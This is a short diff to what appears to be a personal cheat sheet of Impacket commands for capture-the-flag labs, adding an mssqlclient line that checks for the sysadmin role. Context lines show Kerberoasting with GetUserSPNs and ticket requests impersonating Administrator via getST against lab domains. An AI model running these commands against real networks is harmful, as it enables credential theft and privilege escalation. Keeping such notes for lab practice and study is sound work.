@@ -91,6 +91,10 @@ impacket-GetUserSPNs vulnnet-rst.local/$username:$password -dc-ip $ip -request
 ```
 impacket-getST -k -impersonate Administrator -spn cifs/HayStack.thm.corp thm.corp/DARLA_WINTERS
 ```
+## Impacket-mssqlclient
+```
+SQL (ARCHETYPE\sql_svc  dbo@master)> select is_srvrolemember('sysadmin');
+```
 
 
 # Kerbrute
